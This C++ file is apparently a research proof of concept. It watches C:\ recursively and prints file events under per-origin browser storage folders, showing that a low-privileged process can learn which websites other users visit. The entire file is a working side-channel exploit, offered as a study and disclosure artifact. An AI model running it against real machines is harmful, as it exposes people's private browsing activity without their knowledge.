// For this artifact (Website Leakage), we used Claude Code (Opus 4.8) to
// generate a higher performant minimal proof of concept, compared to the one we
// used for submission.

// Watch C:\ recursively, print every event whose path falls under a Firefox
// profile directory. A low privileged watcher on a readable directory (C:\)
// sees traffic inside a directory it should not (e.g., users' home directories)

#include <windows.h>
#include <iostream>
#include <string>

static const wchar_t *ActionName(DWORD action) {
  switch (action) {
  case FILE_ACTION_ADDED: return L"ADDED";
  case FILE_ACTION_REMOVED: return L"REMOVED";
  case FILE_ACTION_MODIFIED: return L"MODIFIED";
  case FILE_ACTION_RENAMED_OLD_NAME: return L"RENAMED_FROM";
  case FILE_ACTION_RENAMED_NEW_NAME: return L"RENAMED_TO";
  default: return L"UNKNOWN";
  }
}

static const DWORD kFilter = FILE_NOTIFY_CHANGE_FILE_NAME |
                             FILE_NOTIFY_CHANGE_DIR_NAME |
                             FILE_NOTIFY_CHANGE_LAST_WRITE;

int wmain() {
  HANDLE dir = CreateFileW(
      L"C:\\", FILE_LIST_DIRECTORY,
      FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL,
      OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OVERLAPPED, NULL);
  if (dir == INVALID_HANDLE_VALUE) {
    std::wcerr << L"CreateFileW(C:\\) failed: " << GetLastError() << L"\n";
    return 1;
  }

  std::wcout << L"watching C:\\ (recursive), printing only paths containing "
                L"\"http\" (per-origin browser storage dirs)\n"
             << std::flush;

  static BYTE buf[2][1 << 20]; // two 1MB buffers, C:\ is noisy
  OVERLAPPED ov = {};
  ov.hEvent = CreateEventW(NULL, FALSE, FALSE, NULL);
  int cur = 0;

  if (!ReadDirectoryChangesW(dir, buf[cur], sizeof(buf[cur]), /*recursive=*/TRUE,
                             kFilter, NULL, &ov, NULL)) {
    std::wcerr << L"ReadDirectoryChangesW failed: " << GetLastError() << L"\n";
    return 1;
  }

  for (;;) {
    DWORD bytes = 0;
    if (!GetOverlappedResult(dir, &ov, &bytes, /*bWait=*/TRUE)) {
      std::wcerr << L"GetOverlappedResult failed: " << GetLastError() << L"\n";
      break;
    }

    int done = cur;
    cur ^= 1;
    // Re-arm the read immediately, before printing, so the kernel keeps
    // buffering into the other buffer while the console I/O below runs.
    if (!ReadDirectoryChangesW(dir, buf[cur], sizeof(buf[cur]),
                               /*recursive=*/TRUE, kFilter, NULL, &ov, NULL)) {
      std::wcerr << L"ReadDirectoryChangesW failed: " << GetLastError() << L"\n";
      break;
    }

    if (bytes == 0) { // too many events at once: this batch was dropped
      std::wcerr << L"buffer overflow (too many events at once), skipping\n";
      continue;
    }

    auto *entry = reinterpret_cast<FILE_NOTIFY_INFORMATION *>(buf[done]);
    for (;;) {
      std::wstring name(entry->FileName,
                         entry->FileNameLength / sizeof(WCHAR));
      if (name.find(L"http") != std::wstring::npos) {
        // Flush each hit so piped/redirected output appears live. Matches are
        // rare and the read is already re-armed, so this can't cause the hang.
        std::wcout << L"[" << ActionName(entry->Action) << L"] C:\\" << name
                   << std::endl;
      }
      if (entry->NextEntryOffset == 0) break;
      entry = reinterpret_cast<FILE_NOTIFY_INFORMATION *>(
          reinterpret_cast<BYTE *>(entry) + entry->NextEntryOffset);
    }
  }

  CloseHandle(dir);
  return 0;
}
